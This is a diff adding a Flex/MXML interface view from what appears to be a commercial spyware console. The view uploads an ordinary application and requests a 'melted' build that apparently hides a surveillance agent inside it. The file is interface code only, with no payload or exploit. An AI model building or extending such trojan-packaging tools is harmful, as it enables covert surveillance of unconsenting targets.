@@ -1,0 +1,124 @@
+<?xml version="1.0" encoding="utf-8"?>
+<s:Group xmlns:fx="http://ns.adobe.com/mxml/2009" 
+         xmlns:s="library://ns.adobe.com/flex/spark" 
+         xmlns:mx="library://ns.adobe.com/flex/mx" width="100%" height="100%" xmlns:build="it.ht.rcs.console.operations.view.agents.build.*">
+  <fx:Script>
+    <![CDATA[
+      import it.ht.rcs.console.operations.view.agents.build.UploadPopup;
+      import it.ht.rcs.console.monitor.controller.LicenseManager;
+      import it.ht.rcs.console.task.controller.DownloadManager;
+      import it.ht.rcs.console.utils.AlertPopUp;
+      
+      import locale.R;
+      
+      import mx.core.UIComponent;
+      import mx.managers.PopUpManager;
+      import mx.rpc.events.FaultEvent;
+      import mx.rpc.events.ResultEvent;
+      
+      private var fileReference:FileReference;
+      
+      [Bindable]
+      private var _platform:String;
+      
+      private function browse():void
+      {
+        fileReference = new FileReference();
+        fileReference.addEventListener(Event.SELECT, fileSelection);
+        fileReference.browse();
+      }
+      
+      private function fileSelection(event:Event):void
+      {
+        currentState = 'fileSelected';
+        fileName.text = event.target.name;
+      }
+      
+      private var uploadPopup:UploadPopup;
+      private function create():void
+      {
+        
+        if (currentState != 'fileSelected') {
+          AlertPopUp.show(R.get('SELECT_FILE'));
+          return;
+        }
+        
+        fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
+        fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
+        fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
+        fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onUploadComplete);
+        
+        uploadPopup = PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
+        uploadPopup.fileReference = fileReference;
+        PopUpManager.centerPopUp(uploadPopup);
+      }
+      
+      
+      private function onUploadError(event:Event):void
+      {
+        PopUpManager.removePopUp(uploadPopup);
+        AlertPopUp.show(event.type);
+      }
+      
+      private function onUploadComplete(event:DataEvent):void
+      {
+        PopUpManager.removePopUp(uploadPopup);
+        
+        var params:Object = {platform: parentDocument.platform, 
+                             binary: {demo: createBtn.demo.selected, admin: admin.selected}, 
+                             melt: {admin: admin.selected, input: event.data, codec: codec.selected, bit64: bit64.selected} };
+        
+        params['factory'] = {_id: parentDocument.factory._id};
+        
+        var filename:String = parentDocument.factory.name + "_" + parentDocument.platform + '_melted.zip'
+        
+        DownloadManager.instance.createTask("build", filename, params, onSuccess, onFailure);
+      }
+      
+      private function onSuccess(e:ResultEvent):void
+      {
+        PopUpManager.removePopUp(((parentDocument as UIComponent).parentDocument).hostComponent);
+      }
+      
+      private function onFailure(e:FaultEvent):void
+      {
+        AlertPopUp.show(R.get('TASK_ALREADY_CREATED'));
+      }
+
+      public function set platform(platform:*):void
+      {
+        if (platform == null)
+          return;
+        
+        _platform = platform;
+        
+        createBtn.platforms = [platform];
+      }
+    ]]>
+  </fx:Script>
+  
+  <s:states>
+    <s:State name="normal"/>
+    <s:State name="fileSelected"/>
+  </s:states>
+    
+  <s:CheckBox id="admin" left="10" top="10" label="{R.get('REQUIRE_ADMIN')}"
+              fontWeight="bold" selected="true"/>
+  <s:TextArea left="25" top="25" width="280" height="55" borderVisible="false"
+              contentBackgroundAlpha="0.0" editable="false"
+              text="{R.get('REQUIRE_ADMIN_DESC')}" />
+  
+
+  <s:HGroup left="10" top="70" height="25" verticalAlign="middle">
+    <s:Label text="{R.get('APPLICATION_DROPPER')}:" fontWeight="bold"/>
+    <s:Button excludeFrom="fileSelected" width="100" label="{R.get('BROWSE')}..." click="browse()"/>
+    <s:Label id="fileName" includeIn="fileSelected" buttonMode="true" click="browse()"
+             maxDisplayedLines="1" width="140" toolTip="{R.get('CLICK_TO_CHANGE_FILE')}"/>    
+  </s:HGroup>
+  
+  <s:CheckBox left="10" top="110" id="bit64" label="{R.get('INCLUDE_64BIT')} (100 KiB)" fontWeight="bold" selected="true" visible="{_platform == 'windows'}"/>
+  <s:CheckBox left="10" top="130" id="codec" label="{R.get('INCLUDE_AUDIO')} (200 KiB)" fontWeight="bold" selected="true" visible="{_platform == 'windows'}"/>
+
+  <build:CreateWithDemoButton id="createBtn" left="10" bottom="0" right="10" create="{create}"/>
+  
+</s:Group>
